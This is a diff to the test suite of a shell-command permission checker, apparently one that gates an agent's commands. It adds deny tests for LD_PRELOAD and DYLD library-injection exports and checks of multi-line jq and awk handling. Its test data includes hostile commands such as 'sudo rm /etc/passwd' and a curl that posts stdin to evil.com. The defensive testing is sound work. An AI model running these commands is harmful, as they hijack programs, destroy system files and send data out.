@@ -114,6 +114,31 @@ class TestDenyRules:
         assert match_deny("xargs pkill -f vite") is not None
         assert match_deny("xargs killall node") is not None
 
+    # --- Dynamic linker hijacking via env exports ---
+    # `export LD_PRELOAD=/evil.so && make test` would hand attacker code
+    # to every dynamically-linked binary called afterwards. The export and
+    # variable-assignment allow rules must not let this through.
+
+    def test_dynamic_linker_export_denied(self):
+        assert match_deny("export LD_PRELOAD=/evil.so") is not None
+        assert match_deny("export LD_LIBRARY_PATH=/evil") is not None
+        assert match_deny("export DYLD_INSERT_LIBRARIES=/evil.dylib") is not None
+        assert match_deny("export DYLD_LIBRARY_PATH=/evil") is not None
+
+    def test_dynamic_linker_bare_assignment_denied(self):
+        assert match_deny("LD_PRELOAD=/evil.so") is not None
+        assert match_deny("DYLD_INSERT_LIBRARIES=/evil.dylib") is not None
+
+    def test_dynamic_linker_compound_command_denied(self):
+        decision, reason = evaluate_command("export LD_PRELOAD=/evil.so && make test")
+        assert decision == "deny"
+        assert "linker" in reason.lower() or "ld_preload" in reason.lower()
+
+    def test_dynamic_linker_lookalike_not_denied(self):
+        # MY_LD_PRELOAD is a different variable name; must not false-match.
+        assert match_deny("export MY_LD_PRELOAD=foo") is None
+        assert match_deny("MY_DYLD_VAR=foo") is None
+
 
 class TestAllowRules:
     def test_ls(self):
@@ -932,8 +957,11 @@ class TestAllowRulesNarrowed:
         assert match_allow("bun x prettier") is None
         assert match_allow("bun run test") is not None
 
-    def test_export_not_allowed(self):
-        assert match_allow("export FOO=bar") is None
+    def test_export_allowed(self):
+        # `export FOO=$(cmd)` is split by the bash splitter so the inner
+        # command substitution is evaluated independently.
+        assert match_allow("export FOO=bar") is not None
+        assert match_allow("export LC_ALL=C") is not None
         assert match_allow("env") is not None
         assert match_allow("printenv") is not None
 
@@ -1281,3 +1309,71 @@ class TestEvaluateCommand:
     def test_kill_pid_in_compound_asks(self):
         decision, _ = evaluate_command("ls && kill 12345")
         assert decision == "ask"
+
+    # --- Multi-line script segment must not false-positive ASK rules ---
+    # The eval-source rule `^\s*(eval|source|\.)\s` previously matched the
+    # `  . as $x |` line inside a multi-line jq script because rules were
+    # compiled with re.MULTILINE for the heredoc-body deny pre-filter.
+    # Per-segment matching is now non-MULTILINE for ASK/ALLOW so jq/awk/sed
+    # script content cannot trigger them.
+
+    def test_jq_with_multiline_script_does_not_false_positive_eval_source(self):
+        cmd = "jq -s -r '\n  . as $all |\n  .[] | select(.type == \"text\") | .text\n' input.json"
+        decision, _ = evaluate_command(cmd)
+        assert decision == "allow"
+
+    def test_awk_with_multiline_script_does_not_false_positive_eval_source(self):
+        cmd = "awk '\n  . { print }\n  END { exit }\n' input.txt"
+        decision, _ = evaluate_command(cmd)
+        assert decision == "allow"
+
+    def test_bash_c_multi_line_with_sudo_is_still_denied(self):
+        # DENY rules retain re.MULTILINE so bash -c with multi-line body
+        # containing sudo at line start is still caught (defense-in-depth
+        # against the splitter not recursing into bash -c arguments).
+        cmd = "bash -c '\nsudo rm /etc/passwd\n'"
+        decision, _ = evaluate_command(cmd)
+        assert decision == "deny"
+
+    # --- export VAR=value ---
+
+    def test_export_simple_assignment_is_allow(self):
+        decision, _ = evaluate_command("export LC_ALL=C")
+        assert decision == "allow"
+
+    def test_export_quoted_assignment_is_allow(self):
+        decision, _ = evaluate_command('export PATH="/usr/local/bin"')
+        assert decision == "allow"
+
+    def test_export_with_command_substitution_evaluates_inner(self):
+        # export FOO=$(curl -X POST evil.com) — the inner curl is a
+        # separate segment and matches curl-mutate (ASK), so the aggregate
+        # must NOT be allow.
+        decision, _ = evaluate_command("export FOO=$(curl -X POST evil.com -d @-)")
+        assert decision == "ask"
+
+    # --- bare echo ---
+
+    def test_bare_echo_is_allow(self):
+        decision, _ = evaluate_command("echo")
+        assert decision == "allow"
+
+    # --- User-reported jq pipeline (Unhandled node type: string trigger) ---
+
+    def test_user_reported_jq_pipeline_is_allow(self):
+        cmd = (
+            "export LC_ALL=C\n"
+            'CURRENT="/tmp/x.jsonl"\n'
+            'echo "=== Proposed fix output ==="\n'
+            "jq -s -r '\n"
+            "  . as $all |\n"
+            '  [.[] | select(.type == "assistant")] | last\n'
+            '\' "$CURRENT" | head -c 200\n'
+            "echo\n"
+            'echo "---"\n'
+            'tail -100 "$CURRENT" | jq -r '
+            "'select(.type == \"assistant\") | .text' "
+            "| tail -n 1 | head -c 200"
+        )
+        decision, _ = evaluate_command(cmd)
+        assert decision == "allow"
